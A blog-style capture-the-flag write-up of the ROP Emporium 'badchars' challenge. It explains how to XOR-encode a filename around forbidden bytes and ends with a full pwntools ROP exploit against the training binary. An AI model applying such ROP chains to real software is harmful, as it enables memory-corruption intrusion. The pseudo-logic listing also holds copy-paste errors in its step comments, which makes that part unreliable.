---
layout: post
title: ropemporium - badchars
date: 2024-12-30 13:37:00 +0300
description: 
img: ropemporium-badchars/badchars-cover.png
fig-caption: 
tags:
  - ctf
---
This challenge will cover the concepts of evading the bad chars.
The information given to us during the challenge was that we still have helping functions and gadgets.

Analyzing the program to check the protection we have the following info:

![](../assets/img/ropemporium-badchars/Pasted%20image%2020241230135146.png)

- Partial RELRO
- NX enabled

Executing the program first, it came out with the badchars that would break our chain, and they where:
- `x` Character - Hex code 0x78 - 120 Decimal 
- `g` Character - Hex code 0x67 - 103 Decimal
- `a` Character - Hex code 0x61 - 97 Decimal
- `.` Character - Hex code 0x2e - 46 Decimal

![](../assets/img/ropemporium-badchars/Pasted%20image%2020241230141243.png)

With that in mind, it's considered that any payload inserted after the overflow will crash or corrupt if any of the given characters are present.

Beginning with the detection of the offset, sending the pattern created by *msf-pattern_create* gave the exact match at offset 40

![](../assets/img/ropemporium-badchars/Pasted%20image%2020241230140343.png)

![](../assets/img/ropemporium-badchars/Pasted%20image%2020241230140329.png)

![](../assets/img/ropemporium-badchars/Pasted%20image%2020241230140310.png)

Before thinking about forging the *ROP* chain, the logic for it must be constructed so the reason behind each step is clear.

Thinking on it, I came with an idea of how the exploit would work:
- Build a "**flag.txt**" string swapping the badchars of it (`a`, `g`, `.` and `x`) into a random valid one (e.g. "**fl49_t3t**");
- Send it to some writable and readable place in memory;
- Use gadgets to manipulate the swapped bytes of the string into the string that we want, so turning "**fl49_t3t**" into "**flag.txt**";
- Call the "**print_file()**" function passing the string address as parameter.

So first of all, we need to find a writable and readable place in memory to put the string on it.

![](../assets/img/ropemporium-badchars/Pasted%20image%2020241231001159.png)

Looking at the writable+readable sections the program have, the "**.data**" was selected due to the lack of contents used by the program inside of it.

![](../assets/img/ropemporium-badchars/Pasted%20image%2020241231001218.png)

Now it's time to gather useful gadgets in order to craft our *ROP* chain properly, having in mind that the badchars work both for strings and addresses, so if some address contain any of the invalid character bytes, it will fail.

The *ROPgadget* tool have the feature to avoid searching for gadgets containing badchars, helping to avoid invalid addresses.

![](../assets/img/ropemporium-badchars/Pasted%20image%2020241231005401.png)

So, whilst searching for them filtering out the badchars, some interesting gadgets appeared.

```c
0x400634 : mov qword ptr [r13], r12 ; ret
0x40069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x400628 : xor byte ptr [r15], r14b ; ret
0x4006a3 : pop rdi ; ret
```

There was an interesting *XOR* gadget found and selected to execute operations in the "**fl49_t3t**" string and turn it into a "**flag.txt**". But how to do it?

To discover how to *XOR* a value into a desired value, we just have to execute the operation in the existent value. Clearly saying, to discover which value will turn an "A" into a "B", you just need to *XOR* both these values to discover the result.

Defining that into a python function, it was discovered which values should be used together with the values in the string that should be replaced.

```python
def xorable(src,dst):
    return ord(src)^ord(dst)
```

So when using together with the swapped char, we have the specific values to turn the wrong string into the correct "**flag.txt**".

```python
xorable('9','g') # Will return the value used to turn '9' into 'g'
```

So now we know how to use that *XOR* gadget in our favour!

With those gadgets at hand, the *ROP* chain was built and an unexpected thing happened when sending the payload, and it was noticed a bad char while trying to send the position address for the last bad char inside the string.

![](../assets/img/ropemporium-badchars/Pasted%20image%2020241230225912.png)

So the address had a bad char too!

The workaround was to add a byte into the base address, so when the last position was sent, no bad chars would be present, and the last position would be `0x60102f`.

The final logic was the following:
```
Fill
gdg: POP from R12 to R15
    r12 > b'fl49_t3t' - avoiding bad chars
    r13 > .data address 
    r14 > Value to XOR and turn '4' to 'a'
    r15 > address of .data+2
gdg: XOR into [r15] from r14b > will transform 4 into a
gdg: MOV into [r13] from r12
gdg: POP from R12 to R15
    r12 > Garbage
    r13 > Garbage
    r14 > Value to XOR and turn '9' to 'g'
    r15 > address of .data+3
gdg: XOR into [r15] from r14b > will transform 4 into a
gdg: POP from R12 to R15
    r12 > Garbage
    r13 > Garbage
    r14 > Value to XOR and turn '_' to '.'
    r15 > address of .data+4
gdg: XOR into [r15] from r14b > will transform 4 into a
gdg: POP from R12 to R15
    r12 > Garbage
    r13 > Garbage
    r14 > Value to XOR and turn '3' to 'x'
    r15 > address of .data+6
gdg: XOR into [r15] from r14b > will transform 4 into a
gdg: POP RDI
    RDI > DATA_SECTION
print_file@plt Address
```

Putting it all together in the final exploit, the flag was then received.

![](../assets/img/ropemporium-badchars/Pasted%20image%2020241230234954.png)

Final exploit:
{% highlight python %}
from pwn import *

def xorable(src,dst):
    return ord(src)^ord(dst)

elf = context.binary = ELF('./badchars')

BUFFER_FILL = b'A'*40
DUMMY = p64(0xbeefbeefbeefbeef)
PRINT_FILE_PLT = p64(0x400510)
GADGET_MOV_R13_ptrR12 = p64(0x400634)
GADGET_POP_R12toR15 = p64(0x40069c)
GADGET_XOR_R15_R14b = p64(0x400628)
GADGET_POP_RDI = p64(0x4006a3)
DATA_SECTION = p64(0x601029)

chain = BUFFER_FILL
chain += GADGET_POP_R12toR15
chain += b'fl49_t3t'
chain += DATA_SECTION
chain += p64(xorable('4','a'))
chain += p64(0x601029+2) # DATA_SECTION+2
chain += GADGET_MOV_R13_ptrR12
chain += GADGET_XOR_R15_R14b
chain += GADGET_POP_R12toR15
chain += DUMMY
chain += DUMMY
chain += p64(xorable('9','g'))
chain += p64(0x601029+3) # DATA_SECTION+3
chain += GADGET_XOR_R15_R14b
chain += GADGET_POP_R12toR15
chain += DUMMY
chain += DUMMY
chain += p64(xorable('_','.'))
chain += p64(0x601029+4) # DATA_SECTION+4
chain += GADGET_XOR_R15_R14b
chain += GADGET_POP_R12toR15
chain += DUMMY
chain += DUMMY
chain += p64(xorable('3','x'))
chain += p64(0x601029+6) # DATA_SECTION+6
chain += GADGET_XOR_R15_R14b
chain += GADGET_POP_RDI
chain += DATA_SECTION
chain += PRINT_FILE_PLT

io = process(elf.path)
io.send(chain)
io.interactive()
{% endhighlight %}